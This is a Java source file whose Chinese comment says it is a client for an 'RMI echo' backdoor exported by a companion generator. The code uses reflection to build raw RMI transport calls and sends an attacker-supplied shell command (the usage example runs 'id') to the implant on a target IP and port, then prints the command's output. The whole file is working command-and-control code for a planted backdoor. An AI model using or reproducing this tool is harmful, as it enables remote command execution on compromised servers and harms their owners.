package com.client;

import sun.rmi.server.UnicastRef;
import sun.rmi.transport.Connection;
import sun.rmi.transport.StreamRemoteCall;
import sun.rmi.transport.tcp.TCPChannel;
import sun.rmi.transport.tcp.TCPEndpoint;
import sun.rmi.transport.tcp.TCPTransport;

import javax.management.ObjectName;
import javax.management.remote.rmi.RMIConnection;
import javax.security.auth.Subject;
import java.io.ObjectInput;
import java.io.ObjectOutput;
import java.lang.reflect.Constructor;
import java.lang.reflect.Method;
import java.net.Socket;
import java.rmi.MarshalledObject;
import java.rmi.server.ObjID;
import java.rmi.server.RemoteObjectInvocationHandler;
import java.rmi.server.UID;
import java.util.LinkedList;

/*
* 用以连接Rmi.Echo生成的rmi echo回显马
* 由于Rmi.Echo是直接export Object，没有使用rmi registry。所以常规的lookup是没法连接的，需要仿写remote object的交互才行
* */
public class Rmi {
    public static void main(String[] args) throws Exception{
        if (args.length < 3){
            System.out.println("Usage:\n"
                        .concat("java -jar GenerateNoHard.jar com.client.Rmi <ip> <rmi export object port> <command>\n"
                        .concat("example:\n")
                        .concat("java -jar GenerateNoHard.jar com.client.Rmi 10.10.10.10 7777 id")
                        )
            );
            return;
        }
        String ip = args[0];
        int port = Integer.valueOf(args[1]);
        String command = args[2];

        Object[] params = new Object[]{
                null,
                command,
                null,
                null,
                null
        };

        UID uid = new UID((short)12345);
        Constructor<ObjID> objIDConstructor = ObjID.class.getDeclaredConstructor(new Class[]{
                long.class,
                UID.class
        });
        objIDConstructor.setAccessible(true);
        ObjID objID = objIDConstructor.newInstance(new Object[]{
                123456789L,
                uid
        });

        Socket socket = new Socket(ip, port);
        LinkedList<TCPEndpoint> tcpEndpoints = new LinkedList<>();
        TCPEndpoint tcpEndpoint = new TCPEndpoint(ip, port);
        tcpEndpoints.add(tcpEndpoint);

        Constructor<TCPTransport> tcpTransportConstructor = TCPTransport.class.getDeclaredConstructor(new Class[]{
                LinkedList.class
        });
        tcpTransportConstructor.setAccessible(true);
        TCPTransport tcpTransport = tcpTransportConstructor.newInstance(new Object[]{
                tcpEndpoints
        });


        Constructor<TCPChannel> tcpChannelConstructor = TCPChannel.class.getDeclaredConstructor(new Class[]{
                TCPTransport.class,
                TCPEndpoint.class
        });
        tcpChannelConstructor.setAccessible(true);
        TCPChannel tcpChannel = tcpChannelConstructor.newInstance(new Object[]{
                tcpTransport,
                tcpEndpoint
        });

        Connection tcpConnection = tcpChannel.newConnection();
        Method method = RMIConnection.class.getMethod("invoke", new Class[]{
                ObjectName.class,
                String.class,
                MarshalledObject.class,
                String[].class,
                Subject.class
        });
        Method getMethodHashMethod = RemoteObjectInvocationHandler.class.getDeclaredMethod("getMethodHash", new Class[]{
                Method.class
        });
        getMethodHashMethod.setAccessible(true);
        Long opnum = (Long) getMethodHashMethod.invoke(null, new Object[]{
                method
        });

        StreamRemoteCall streamRemoteCall = new StreamRemoteCall(tcpConnection, objID, -1, opnum);
        Method marshalValueMethod = UnicastRef.class.getDeclaredMethod("marshalValue", new Class[]{
                Class.class,
                Object.class,
                ObjectOutput.class
        });
        marshalValueMethod.setAccessible(true);

        Class<?>[] types = method.getParameterTypes();
        for (int i = 0; i < types.length; i++) {
            marshalValueMethod.invoke(null, new Object[]{
                    types[i], params[i], streamRemoteCall.getOutputStream()
            });
        }
        streamRemoteCall.executeCall();

        Class<?> returnType = method.getReturnType();
        ObjectInput inputStream = streamRemoteCall.getInputStream();
        Method unmarshalValueMethod = UnicastRef.class.getDeclaredMethod("unmarshalValue", new Class[]{
                Class.class,
                ObjectInput.class
        });
        unmarshalValueMethod.setAccessible(true);
        Object invoke = unmarshalValueMethod.invoke(null, new Object[]{
                returnType,
                inputStream
        });
        System.out.println("[+] Result:\n");
        System.out.println(invoke);
    }
}
